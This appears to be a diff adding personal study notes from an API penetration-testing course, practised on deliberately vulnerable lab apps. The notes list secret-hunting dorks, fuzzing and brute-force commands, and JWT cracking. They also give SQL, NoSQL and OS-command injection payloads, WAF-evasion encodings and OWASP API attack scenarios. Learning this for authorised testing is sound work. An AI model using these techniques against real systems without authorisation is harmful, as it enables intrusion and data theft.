@@ -1,0 +1,309 @@
+COURSE URL: https://university.apisec.ai/   >> This course used to be called "APIsec Certified Expert" by Corey Ball who is the author of the Hacking APIs.
+We tested The Completely Ridiculous API (crAPI) and Vapi as vulnerable app.
+Three type of APIs: public, private and Partner apis
+
+#Passive Reconnaissance
+   i) googledork
+inurl:"/wp-json/wp/v2/users"
+intitle:"index.of" intext:"api.txt"
+inurl:"/api/v1" intext:"index of /"
+ext:php inurl:"api.php?action="
+intitle:"index of" api_key OR "api key" OR apiKey -pool
+   ii) Githubdork
+filename:swagger.json
+extension: .json
+api key,api keys,api_keys,api-key apikey, authorization: Bearer, access_token, secret, token, refreshtoken, refresh_token, refresh-token
+
+#Active API Reconnaissance
+nmap -sV --script=http-enum <target> -p 80,443,8000,8080
+For Brute api use:
+wfuzz --hc 404 -Lc -z file,wordlists/apipath.txt https://miro.com/FUZZ
+kr scan targets.txt -w routes.kite -A=apiroutes-221228:20000 -x 10 --ignore-length=34
+
+#Reverse Engineering an API
+  i)using postman
+use the "Capture Requests button" in postman
+set up in FoxyProxy (5555)
+navigate to target website, and use FoxyProxy to enable the Postman option
+after capture all request and make a cllection and use the "add to Collection" link
+# Automatic Documentation
+run > mitmweb
+after filter nd saving file run 
+> sudo mitmproxy2swagger -i /Downloads/flows -o spec.yml -p http://crapi.apisec.ai -f flow 
+edit the spec.yml file to see if mitmproxy2swagger has ignored too many endpoints remove "- ignore:"
+Save the updated spec.yml file and run the mitmproxy2swagger again. This time around add the "--examples" flag to enhance your API documentation.
+import spec.yml file https://editor.swagger.io/
+In Postman Workspace, you can click the "Import" button.
+
+#Editing Postman Collection Variables
+use collection editor to edit variable and Updating Postman Collection Authorization and save the collection
+find Excessive Data Exposure
+
+#Finding Security Misconfigurations(Scanning APIs)
+i)nikto -h http://crapi.apisec.ai
+ii)Scanning APIs with OWASP ZAP
+run zap
+  a) unuthenticate scan
+click import and "import an open api definition from local file system" and select specs.yml and make sure to add the URL that you are expecting (http://crapi.apisec.ai or http://127.0.0.1:8888). 
+You can right-click on the root, in this instance http://crapi.apisec.ai, and choose to do an active scan. Once this scan completes you can find the results under the Alerts tab.
+  b) authenticated scan
+The easiest way to perform authenticated scanning is to use the Manual Explore option.
+Set the URL to your target, make sure the HUD is enabled, and choose "Launch Browser".
+Perform all of those actions again
+then turn attack mode on and do active scan
+
+  #API Authentication Attacks 
+# NOw it's time to authenticate in postman and generate a token
+Password Brute-Force Attacks
+Password Spraying: You could craft a list of the nine most likely passwords (one less password than the limit) and use these to attempt to log in to many user accounts
+grep for email in Excessive Data Exposure:  grep -oe "[a-zA-Z0-9._]\+@[a-zA-Z]\+.[a-zA-Z]\+" response.json
+#API Token Attacks
+analyze token in burp Sequencer and see how randomness token is 
+# JWT Attacks
+jwttool -t http://target-name.com/ -rh "Authorization: Bearer JWT_Token" -M pb
+#The None Attack and remove signature part
+The Algorithm Switch Attack
+bruteforse secretkey
+hashcat -a 0 -m 16500 <YOUR-JWT> wordlists/jwt.secret.txt
+  #Exploiting API Authorization
+(RESTful APIs are stateless, so when a consumer authenticates to these APIs, no session is created between the client and server)
+i)Broken Object Level Authorization(like an idor)
+  -Finding Resource IDs and Requests(https://kajabi-storefronts-production.kajabi-cdn.com/kajabi-storefronts-production/site/2147573912/products/expdzRMeT7oYzCVtiZAC_Authz3.PNG)
+  -Searching for BOLA(let's think about the purpose of our target app and review the documentation)
+Q)What can you do with this app? 
+Q)Do you get your own profile? 
+Q)Can you upload files? 
+Q)Do you have an account balance? 
+Q)Is there any part of the app that has data specific to your account
+  When searching for authorization vulnerabilities the most effective way to find authorization weaknesses is to create two accounts 
+  and perform A-B testing.
+perform the BOLA attack by replacing UserB's token with UserA's token
+
+
+ii)Broken functional Level Authorization
+BOLA is all about accessing resources that do not belong to you, BFLA is all about performing unauthorized actions.
+we can find requests that create, update, and delete resources specified by a resource ID then we will be on the right track
+   #Testing for Improper Assets Management
+Testing for Improper Assets Management is all about discovering unsupported and non-production versions of an API.
+So, when you analyze a collection that you are targeting you will need to find requests that:
+Accept user input
+Have the potential to modify objects
+Select the crAPI collection options, choose Edit, and select the Tests tab
+You can use the following test:
+pm.test("Status code is 200", function () { pm.response.to.have.status(200); })
+Run an unauthenticated baseline scan using collection runner
+Next, use "Find and Replace" find(v2)>>replace with {{ver}} and use the eye icon located at the top right of Postman as a shortcut
+Now you can update to test for various versioning-related paths such as v1, v2, v3, mobile, internal, test, stage, beta and uat.
+use collection runner
+ then repeate authenticated scan
+  #Mass Assignment Attacks
+One of the ways that you can discover mass assnmignment vulnerabilities by finding interesting parameters in API documentation and 
+then adding those parameters to requests. Look for parameters involved in user account properties, critical functions, and administrative actions.
+ when an attacker is able to overwrite object properties that they should not be able to
+intercept sigin do simple test
+"isadmin": true,
+"isadmin":"true",
+"admin": 1,
+"admin": true,
+use param miner and arjun for fuzzing parameter get, post and json body
+   #Server-side request -forgery
+You can also use one of these other free sites: 
+http://pingb.in/ 
+https://requestbin.com/ 
+https://canarytokens.org/ 
+
+When targeting an API for SSRF vulnerabilities, you will want to look for requests that have any of the following:
+Include full URLs in the POST body or parameters
+Include URL paths (or partial URLs) in the POST body or parameters
+Headers that include URLs like Referer
+Allows for user input that may result in a server retrieving resources
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
+
+   #Injection Attacks 
+The best way to discover these injection points is by fuzzing
+The payloads used for fuzzing include symbols, numbers, system commands, SQL queries, NoSQL queries, emojis, hexadecimal, boolean statements, and more.
+Headers
+Query string parameters
+Parameters in POST/PUT requests
+which os, webserver, database and programming language uses by the target
+where to fuzz and what to fuzz with
+use postman "find and replace" and wfuzz for injection attack
+if the API is expecting a certain type of input (number, string, boolean value) send:
+A very large number
+A very large string
+A negative number
+A string (instead of a number or boolean value)
+Random characters
+Boolean values
+  #Some sql Meta characters
+'
+''
+;%00
+--
+-- -
+""
+;
+' OR '1
+' OR 1 -- -
+" OR "" = "
+" OR 1 = 1 -- -
+' OR '' = '
+OR 1=1
+
+NoSQL metacharacters you could send in an API request to manipulate the database:
+$gt 
+{"$gt":""}
+{"$gt":-1}
+$ne
+{"$ne":""}
+{"$ne":-1}
+ $nin
+{"$nin":1}
+{"$nin":[1]}
+{"$where":  "sleep(1000)"}
+
+ Operating system commands:
+
+|
+
+||
+
+&
+
+&&
+
+'
+
+"
+
+;
+
+'"
+Fuzzing Wide with Postman
+use "find and replace" and collection runner in postman and burpsuit
+make {{fuzz}} variable to post body and header, and query paramater in postman
+make 4 or 5 environment variable like "fuzz   ||id"
+						   "fuzz 'OR 1=1-- -"    "&gt"   admin'-- -
+
+see test the total count was:
+
+One 200 Success
+Four 500 Internal Server Error
+Two 404 Not Found
+Three 400 Bad Request
+#Fuzzing Deep with WFuzz
+wfuzz -z file,usr/share/wordlists/nosqli  -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" -d "{\"coupon_code\":FUZZ} http://crapi.apisec.ai/community/api/v2/coupon/validate-coupon
+
+#Evasion and Combining Techniques
+Here is a list of potential string terminators you can use:
+%00
+0x00
+//
+;
+%
+!
+?
+[]
+%5B%5D
+%09
+%0a
+%0b
+%0c
+%0e
+like: “uname”: “hapihacker”
+“pass”: "%00'OR 1=1"
+}
+ #Case Switching
+POST /api/myProfile 
+POST /api/MyProfile 
+POST /aPi/MypRoFiLe 
+  #Encoding Payloads
+URL Encoded Payload: %27%20%4f%52%20%31%3d%31%3b
+API Provider URL Decoder: ' OR 1=1;
+WAF Rules detect a fairly obvious SQL Injection attack and block the payload.
+Double URL Encoded Payload: %25%32%37%25%32%30%25%34%66%25%35%32%25%32%30%25%33%31%25%33%64%25%33%31%25%33%62
+API Provider URL Decoder: %27%20%4f%52%20%31%3d%31%3b
+  #Payload Processing with Burp Suite
+AddPrefix:%00
+AddSuffix:%00
+URL-encode all characters
+   #Evasion with Wfuzz
+> wfuzz -e encoders
+> wfuzz -z file,wordlist/api/common.txt,base64 http://hapihacker.com/FUZZ
+> wfuzz -z list,TEST,base64-md5-none  
+> wfuzz -z list,a-b-c,base64-md5-none -u http://hapihacker.com/api/v2/FUZZ
+> wfuzz -z list,TEST,base64@base64@md5 -u http://hapihacker.com/api/v2/FUZZ
+check out the incredible Awesome-WAF GitHub repo (https://github.com/0xInfection/Awesome-WAF),
+
+  #Combining Techniques
+https://university.apisec.ai/products/api-penetration-testing/categories/2150259129/posts/2163170061
+  #Conclusion
+https://dsopas.github.io/MindAPI/
+https://www.youtube.com/playlist?list=PLbyncTkpno5HqX1h2MnV6Qt4wvTb8Mpol
+https://github.com/arainho/awesome-api-security
+
+
+
+     Broken Object Level Authorization
+/shops/{shopName}/revenue_data.json
+X-User-Id: 54796. Replacing the X-User-Id value with 54795
+       Broken User Authentication
+Credential stuffing (using lists of known usernames/passwords), is a common attack
+# "/api/system/verification-codes and by providing the username in the request body. Next an SMS token 
+with 6 digits is sent to the victim’s phone. Because the API does not implement a rate limiting policy, 
+the attacker can test all possible combinations using a multi-threaded script, against the 
+/api/system/verification-codes/{smsToken} endpoint to discover the right token within a few minutes."
+       Excessive Data Exposure
+/api/articles/{articleId}/comments/{commentId} endpoint in the articles view to render comments metadata.
+contains PII, to serialize the object.
+/api/sites/111/cameras in order to receive data about the available cameras and show them on the dashboard. 
+The response contains a list with details about cameras in the following format:          
+{"id":"xxx","live_access_token":"xxxx-bbbbb","building_id":"yyy"}
+        Lack of Resources & Rate Limiting
+uploads a large image by issuing a POST request to /api/v1/images
+/api/users?page=1&size=200. An attacker changes the size parameter to 200000
+        Broken Function Level Authorization
+"GET /api/invites/{invite_guid}. The response contains a JSON with details about the invite, including the user’s role and the user’s email.
+An attacker duplicated the request and manipulated the HTTP method and endpoint to POST /api/invites/new. This endpoint
+should only be accessed by administrators using the admin console, which does not implement function level authorization checks."
+"GET /api/admin/v1/users/all. This endpoint returns the details of all the users of the application and does not implement 
+function-level authorization checks"
+          Mass Assignment
+{"user_name":"inons","age":24}
+The request GET /api/v1/users/me includes an additional credit_balance property:
+{"user_name":"inons","age":24,"credit_balance":10}
+The attacker replays the first request with the following payload:
+{"user_name":"attacker","age":60,"credit_balance":99999}
+          Security Misconfiguration
+1.) Undocumented api call
+Scenario #1
+An attacker finds the .bash_history file under the root directory of the server, which contains commands used by the DevOps team to access the API:
+
+$ curl -X GET 'https://api.server/endpoint/' -H 'authorization: Basic Zm9vOmJhcg=='
+An attacker could also find new endpoints on the API that are used only by the DevOps team and are not documented.
+2.)
+To target a specific service, an attacker uses a popular search engine to search for computers directly accessible 
+from the Internet. The attacker found a host running a popular database management system, listening on the default 
+port. The host was using the default configuration, which has authentication disabled by default, and the attacker 
+gained access to millions of records with PII, personal preferences, and authentication data.
+            Injection
+1.)snprintf(cmd, 128, "%srestore_backup.sh /tmp/postfile.bin %s %d",
+         "/mnt/shares/usr/bin/scripts/", appid, 66);
+system(cmd);
+2.)DELETE /api/bookings?bookingId[$ne]=678 //delete another user booking id
+             Improper Assets Management
+Scenario #1
+After redesigning their applications, a local search service left an old API version (api.someservice.com/v1) running, unprotected, 
+and with access to the user database. While targeting one of the latest released applications, an attacker found the API address 
+(api.someservice.com/v2). Replacing v2 with v1 in the URL gave the attacker access to the old, unprotected API, exposing the personal 
+identifiable information (PII) of over 100 Million users.
+
+Scenario #2
+A social network implemented a rate-limiting mechanism that blocks attackers from using brute-force to guess reset password tokens. 
+This mechanism wasn’t implemented as part of the API code itself, but in a separate component between the client and the official API
+(www.socialnetwork.com). A researcher found a beta API host (www.mbasic.beta.socialnetwork.com) that runs the same API, including the 
+reset password mechanism, but the rate limiting mechanism was not in place. The researcher was able to reset the password of any user 
+by using a simple brute-force to guess the 6 digits token.
+             Insufficient Logging & Monitoring
+Access keys of an administrative API were leaked on a public repository.
+
